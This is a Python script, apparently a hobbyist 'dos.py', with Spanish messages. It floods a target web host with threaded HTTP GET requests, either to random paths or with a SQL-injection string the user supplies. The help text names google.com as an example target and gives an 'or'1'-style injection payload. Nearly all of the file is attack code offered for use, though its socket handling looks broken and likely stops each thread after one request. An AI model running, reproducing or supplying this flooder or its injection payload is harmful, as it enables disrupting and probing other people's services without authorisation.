import socket
import sys
import threading
import string
import time
import random
from colorama import Fore
def dos():
    try:
        host, puerto = sys.argv[1], int(sys.argv[2])
        rango = sys.argv[3]
        if host.startswith("https://"):
            host = host.replace("https://","")
            if host.endswith("/"):
                host = host.replace("/","")
        if host.startswith("http://"):
            host = host.replace("http://", "")
            if host.endswith("/"):
                host = host.replace("/","")
        
        ip = str(socket.gethostbyname(host))
        if sys.argv[3] == "-s":
            sqli = sys.argv[4]
            rango1 = int(sys.argv[5])
            for i in range(rango1):
                time.sleep(0.01)
                thread = threading.Thread(target=dos1, args=(ip, host, puerto, sqli, rango))
                thread.start()
        elif rango == "-n":
            rango1 = int(sys.argv[4])
            sqli = ""
            for i in range(rango1):
                time.sleep(0.01)
                thread = threading.Thread(target=dos1, args=(ip, host, puerto, sqli, rango))
                thread.start()

    except socket.gaierror:
        print(f"no se pudo reconocer el host '{host}'")
    except IndexError:
        ayuda()
    except KeyboardInterrupt:
        print(str(Fore.RESET) + "El conocimiento es libre")

   
  
def generar_url_direccion():
    msg = str(string.digits + string.hexdigits+ string.octdigits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data
    
def dos1(ip, host, puerto, sqli, rango):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    texto = f" Atacando a {ip} en el puerto {puerto}"
    colores = str(Fore.RED) + texto, str(Fore.YELLOW) + texto, str(Fore.CYAN) + texto
    dato = "".join(random.sample(colores, 1))

    if rango == "-s":
        try:
            while True:
                servidor.connect((ip, puerto))
                dos = "GET /%s HTTP/1.1\nHost: %s\n\n" % (sqli, host)
                dos1 = dos.encode()
                servidor.send(dos1)
                servidor.close()

                print(dato)
                print(str(Fore.RESET))
        except socket.error:
            print("")
        except KeyboardInterrupt:
            print(Fore.RESET + "El conocimiento es libre")

    elif rango == "-n":
        try:
            while True:
                servidor.connect((ip, puerto))
                data = generar_url_direccion()
                dos = "GET /%s HTTP/1.1\nHost: %s\n\n" % (data, host)
                dos1 = dos.encode()
                servidor.send(dos1)
                servidor.close()

                print(dato)
                print(str(Fore.RESET))
        except socket.error:
            print("")
        except KeyboardInterrupt:
            print(Fore.RESET + "El conocimiento es libre")

    
def ayuda():
    print("""
    -s [Agregar parametro SQLi]
    -n [Agregar cantidad de veces sin parametro SQLi]
    
    Ejemplo:

    python3 dos.py google.com 80 -n 1000
    python3 dos.py google.com 80 -s index.php?cart='1'or'1' 1000
    """)

if __name__ == "__main__":
    dos()
